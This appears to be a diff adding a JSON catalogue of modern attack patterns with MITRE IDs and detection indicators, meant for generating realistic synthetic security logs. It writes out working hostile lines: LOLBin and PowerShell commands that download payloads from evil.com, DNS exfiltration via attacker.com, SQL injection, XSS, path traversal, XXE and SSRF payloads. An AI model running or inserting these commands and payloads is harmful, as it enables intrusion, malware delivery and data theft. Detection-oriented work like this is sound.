@@ -1,0 +1,394 @@
+{
+  "_documentation": {
+    "purpose": "Modern attack patterns for 2025 - NOT cliche SQL injection",
+    "critical_thinking": "User insight: '2025 attacks don't use simple patterns. Need LOLBins, fileless malware, supply chain attacks.'",
+    "why": "Creates realistic, sophisticated logs that demonstrate understanding of current threat landscape",
+    "usage": "When generating logs, use these patterns, not simple/old attacks"
+  },
+  
+  "attack_categories": {
+    "living_off_the_land": {
+      "description": "Using legitimate Windows binaries for malicious purposes",
+      "sophistication": "high",
+      "why_effective": "Bypasses many AVs, looks like legitimate admin activity",
+      "detection_difficulty": "high",
+      "mitre": "T1218",
+      "patterns": [
+        {
+          "name": "Certutil Abuse",
+          "technique": "T1218.011",
+          "command": "certutil -urlcache -split -f http://evil.com/payload.exe c:\\temp\\legit.exe",
+          "why_malicious": "Legitimate cert tool downloading malware",
+          "legitimate_parent": ["cmd.exe", "explorer.exe"],
+          "malicious_parent": ["winword.exe", "excel.exe", "outlook.exe"],
+          "indicators": ["Downloads from non-Microsoft domains", "Saves to temp/appdata"]
+        },
+        {
+          "name": "PowerShell Fileless",
+          "technique": "T1059.001",
+          "command": "powershell -ExecutionPolicy Bypass -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')",
+          "why_malicious": "In-memory execution, no file on disk",
+          "legitimate_parent": ["explorer.exe", "taskmgr.exe"],
+          "malicious_parent": ["winword.exe", "outlook.exe"],
+          "indicators": ["ExecutionPolicy bypass", "WindowStyle hidden", "DownloadString", "IEX"]
+        },
+        {
+          "name": "MSHTA Abuse",
+          "technique": "T1218.005",
+          "command": "mshta http://evil.com/payload.hta",
+          "why_malicious": "Executes remote HTA files",
+          "indicators": ["Remote URL", "Spawned by Office apps"]
+        },
+        {
+          "name": "BITSAdmin File Transfer",
+          "technique": "T1197",
+          "command": "bitsadmin /transfer job /download /priority high http://evil.com/malware.exe c:\\temp\\update.exe",
+          "why_malicious": "Background file download tool",
+          "legitimate_use": "Windows Update",
+          "malicious_use": "Malware staging",
+          "indicators": ["Non-Microsoft URLs", "Unusual timing"]
+        },
+        {
+          "name": "Rundll32 Script Execution",
+          "technique": "T1218.011",
+          "command": "rundll32.exe javascript:\\\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://evil.com/payload.sct\")",
+          "why_malicious": "JavaScript execution via legitimate binary",
+          "indicators": ["JavaScript in command line", "Remote script loading"]
+        }
+      ]
+    },
+    
+    "fileless_malware": {
+      "description": "No files written to disk, memory-only execution",
+      "sophistication": "very_high",
+      "why_effective": "No signature, hard to detect with traditional AV",
+      "detection_method": "Behavioral analysis, memory forensics",
+      "patterns": [
+        {
+          "name": "In-Memory PowerShell Injection",
+          "technique": "T1055",
+          "process_pattern": "powershell.exe → injects into legitimate process",
+          "memory_indicators": ["Unusual memory allocation", "Reflective DLL injection"],
+          "network_indicators": ["C2 connections from injected process"]
+        },
+        {
+          "name": "WMI Persistence",
+          "technique": "T1546.003",
+          "command": "Set-WmiInstance to create malicious event consumer",
+          "why_dangerous": "Survives reboot, no file on disk",
+          "detection": "WMI event subscriptions"
+        }
+      ]
+    },
+    
+    "supply_chain_attacks": {
+      "description": "Compromised software/packages in development pipeline",
+      "sophistication": "very_high",
+      "why_effective": "Trusted by developers, bypasses security",
+      "examples": [
+        {
+          "name": "Malicious NPM Package",
+          "attack_vector": "npm install compromised-package",
+          "payload": "Post-install script exfiltrates environment variables (API keys, secrets)",
+          "indicators": ["Unusual npm package name", "Recent package with no history", "Post-install network activity"],
+          "real_world": "colors.js, node-ipc incidents"
+        },
+        {
+          "name": "Typosquatting",
+          "attack_vector": "pip install reqeusts (instead of requests)",
+          "payload": "Identical to legitimate package but with backdoor",
+          "indicators": ["Package name similarity", "Low download count", "Recent registration"]
+        }
+      ]
+    },
+    
+    "api_cloud_abuse": {
+      "description": "Exploiting cloud APIs and services",
+      "sophistication": "high",
+      "why_effective": "Cloud-native threats, traditional tools don't see them",
+      "patterns": [
+        {
+          "name": "AWS Credential Enumeration",
+          "technique": "T1580",
+          "attack_pattern": "DescribeInstances API called 500 times/minute",
+          "why_malicious": "Attacker mapping infrastructure",
+          "legitimate_baseline": "10-50 calls/hour",
+          "malicious_pattern": "Hundreds of calls in minutes",
+          "indicators": ["Unusual API call volume", "New source IP", "After-hours activity"]
+        },
+        {
+          "name": "S3 Bucket Enumeration",
+          "technique": "T1530",
+          "attack_pattern": "ListBuckets, GetBucketPolicy rapid calls",
+          "goal": "Find misconfigured public buckets",
+          "indicators": ["403/404 errors in rapid succession", "Bucket name guessing patterns"]
+        }
+      ]
+    },
+    
+    "ai_powered_attacks": {
+      "description": "LLM-generated phishing, deepfakes, automated exploitation",
+      "sophistication": "cutting_edge",
+      "why_new": "Traditional detection fails, content is unique each time",
+      "patterns": [
+        {
+          "name": "AI-Generated Phishing",
+          "technique": "T1566 (enhanced)",
+          "characteristics": [
+            "Perfect grammar (no typos)",
+            "Context-aware content (references real projects)",
+            "Personalized for recipient",
+            "Passes traditional spam filters"
+          ],
+          "detection": "Behavioral - unusual email patterns, requests, urgency"
+        },
+        {
+          "name": "Deepfake Voice/Video",
+          "technique": "T1656 (Impersonation)",
+          "attack_vector": "Video call or audio message claiming to be CEO",
+          "payload": "Wire transfer request, credential reset",
+          "detection": "Content analysis (what they're asking for), not deepfake detection"
+        }
+      ]
+    },
+    
+    "polymorphic_malware": {
+      "description": "Malware that changes signature on each execution",
+      "sophistication": "very_high",
+      "why_effective": "No static signature, traditional AV useless",
+      "detection_method": "Behavioral analysis only",
+      "pattern": {
+        "file_hash": "Changes every execution",
+        "static_signature": "None",
+        "behavior": "Consistent (C2 connection, file encryption, etc.)",
+        "indicators": ["Unusual process behavior", "Network patterns", "File system changes"]
+      }
+    },
+    
+    "lateral_movement_modern": {
+      "description": "Moving through network after initial compromise",
+      "sophistication": "high",
+      "patterns": [
+        {
+          "name": "PsExec Lateral Movement",
+          "technique": "T1021.002",
+          "command": "psexec \\\\target-computer -u admin -p password cmd.exe",
+          "legitimate_use": "IT admin remote management",
+          "malicious_indicators": [
+            "After-hours usage",
+            "From non-admin workstation",
+            "Multiple targets in short time",
+            "New user performing action"
+          ]
+        },
+        {
+          "name": "Pass-the-Hash",
+          "technique": "T1550.002",
+          "attack": "Use stolen NTLM hash without knowing password",
+          "indicators": ["NTLM auth from unusual source", "No corresponding Kerberos ticket"]
+        }
+      ]
+    },
+    
+    "data_exfiltration": {
+      "description": "Stealing data from compromised network",
+      "sophistication": "medium to high",
+      "patterns": [
+        {
+          "name": "DNS Tunneling",
+          "technique": "T1048.003",
+          "method": "Exfiltrate data in DNS queries",
+          "example_query": "ZXhmaWx0cmF0ZWRkYXRhMTIzNDU=.evil.com",
+          "indicators": [
+            "Unusually long DNS queries",
+            "High frequency queries to same domain",
+            "Base64-like patterns in subdomain"
+          ]
+        },
+        {
+          "name": "HTTPS Exfiltration",
+          "technique": "T1041",
+          "method": "Upload to legitimate-looking service (pastebin, file sharing)",
+          "indicators": [
+            "Large uploads from internal user",
+            "After-hours upload",
+            "Upload to new/suspicious service"
+          ]
+        }
+      ]
+    }
+  },
+  
+  "classic_attacks_modern_variants": {
+    "description": "Classic attacks still work in 2025, but need modern evasion techniques",
+    
+    "sql_injection": {
+      "why_still_relevant": "Web apps still vulnerable, but detection improved",
+      "old_cliche": "' OR 1=1--",
+      "modern_variants": [
+        {
+          "name": "Time-based Blind SQL",
+          "payload": "'; IF (SELECT COUNT(*) FROM users) > 0 WAITFOR DELAY '00:00:05'--",
+          "why_works": "No error messages, pure timing attack",
+          "detection": "Slow response times, database query duration anomalies"
+        },
+        {
+          "name": "Second-order SQL Injection",
+          "payload": "Username: admin'-- stored in DB, exploited later",
+          "why_works": "Payload stored safely first, executed in different context",
+          "detection": "Hard - requires tracking data flow"
+        },
+        {
+          "name": "JSON SQL Injection",
+          "payload": "{\"username\": \"admin' UNION SELECT password FROM users--\"}",
+          "why_works": "WAFs often don't parse JSON properly",
+          "detection": "JSON payload inspection, parameterized queries missing"
+        },
+        {
+          "name": "Hex-encoded SQL",
+          "payload": "0x61646d696e (hex for 'admin') in queries",
+          "why_works": "Bypasses simple string matching",
+          "detection": "Hex pattern in SQL context"
+        }
+      ]
+    },
+    
+    "xss": {
+      "why_still_relevant": "Client-side attacks still effective",
+      "old_cliche": "<script>alert(1)</script>",
+      "modern_variants": [
+        {
+          "name": "DOM-based XSS",
+          "payload": "URL parameter processed by JavaScript: #hash=<img src=x onerror=eval(atob('base64_payload'))>",
+          "why_works": "No server-side reflection, pure client-side",
+          "detection": "Hard - requires JavaScript analysis"
+        },
+        {
+          "name": "Mutation XSS (mXSS)",
+          "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+          "why_works": "Browser mutates HTML differently than sanitizer expected",
+          "detection": "Requires testing with multiple browsers"
+        },
+        {
+          "name": "Polyglot XSS",
+          "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+          "why_works": "Works in multiple contexts (HTML, JS, CSS)",
+          "detection": "Complex, multi-layer inspection needed"
+        }
+      ]
+    },
+    
+    "command_injection": {
+      "why_still_relevant": "APIs, automation tools still execute system commands",
+      "old_cliche": "; rm -rf / or random.exe",
+      "modern_variants": [
+        {
+          "name": "Obfuscated PowerShell",
+          "payload": "powershell -enc <base64_encoded_command>",
+          "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
+          "why_works": "Encoded, no obvious malicious strings",
+          "detection": "Base64 decode, analyze actual command"
+        },
+        {
+          "name": "Command Substitution",
+          "payload": "ping `whoami`.attacker.com",
+          "why_works": "Exfiltrates data via DNS, looks like ping",
+          "detection": "Unusual DNS patterns, backticks in commands"
+        },
+        {
+          "name": "Environment Variable Injection",
+          "payload": "$PATH=/tmp:$PATH; malicious_binary",
+          "why_works": "Changes execution environment, runs fake binary",
+          "detection": "PATH modifications, unexpected binary locations"
+        }
+      ]
+    },
+    
+    "directory_traversal": {
+      "why_still_relevant": "File access controls still misconfigured",
+      "old_cliche": "../../../../etc/passwd",
+      "modern_variants": [
+        {
+          "name": "Double Encoding",
+          "payload": "..%252f..%252f..%252fetc%252fpasswd",
+          "why_works": "Decoded twice: first by WAF, then by app",
+          "detection": "Multiple URL decode cycles"
+        },
+        {
+          "name": "Null Byte Injection",
+          "payload": "../../../../etc/passwd%00.jpg",
+          "why_works": "Null byte terminates string in C, bypasses extension check",
+          "detection": "Null bytes in file paths"
+        },
+        {
+          "name": "Unicode Bypass",
+          "payload": "..\\u2216..\\u2216..\\u2216etc\\u2216passwd",
+          "why_works": "Unicode characters look like slashes to some parsers",
+          "detection": "Unicode normalization before checking"
+        }
+      ]
+    },
+    
+    "phishing": {
+      "why_still_relevant": "Humans still the weakest link",
+      "old_cliche": "Dear Sir, I am Nigerian Prince...",
+      "modern_variants": [
+        {
+          "name": "AI-Generated Phishing",
+          "characteristics": [
+            "Perfect grammar (no typos)",
+            "Context-aware (references real projects)",
+            "Personalized content",
+            "Passes traditional spam filters"
+          ],
+          "example": "Hi John, Following up on the Q4 budget review meeting. Can you approve this invoice by EOD? [legitimate-looking PDF]",
+          "detection": "Behavioral - unusual urgency, payment requests, link domains"
+        },
+        {
+          "name": "Subdomain Spoofing",
+          "payload": "https://secure-login-microsoft-com.attacker.com/login",
+          "why_works": "Looks like microsoft.com to quick glance",
+          "detection": "Domain analysis, not just substring matching"
+        },
+        {
+          "name": "Homograph Attack",
+          "payload": "https://аpple.com (Cyrillic 'а' looks like Latin 'a')",
+          "why_works": "IDN domains, looks identical visually",
+          "detection": "Unicode character inspection in domains"
+        }
+      ]
+    },
+    
+    "csrf": {
+      "name": "Cross-Site Request Forgery",
+      "modern_variant": {
+        "attack": "Embedded iframe auto-submits form to bank.com/transfer",
+        "why_works": "User already authenticated, browser sends cookies",
+        "detection": "Missing CSRF tokens, unexpected referer headers"
+      }
+    },
+    
+    "xxe": {
+      "name": "XML External Entity",
+      "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>",
+      "why_works": "XML parser loads external entities",
+      "detection": "DTD declarations in XML, SYSTEM entities"
+    },
+    
+    "ssrf": {
+      "name": "Server-Side Request Forgery",
+      "payload": "https://app.com/fetch?url=http://169.254.169.254/latest/meta-data/",
+      "target": "AWS metadata service",
+      "why_works": "Server makes request to internal resource",
+      "detection": "Requests to private IP ranges, cloud metadata IPs"
+    }
+  },
+  
+  "log_creation_rules": {
+    "rule_1": "Use LOLBins for initial access (certutil, powershell, mshta)",
+    "rule_2": "Show multi-stage attacks (phishing → execution → C2 → lateral movement → exfil)",
+    "rule_3": "Include legitimate baseline for comparison",
+    "rule_4": "Modern attacks leave behavioral traces, not file signatures",
+    "rule_5": "Mix normal traffic with attacks (realistic SOC environment)"
+  }
+}
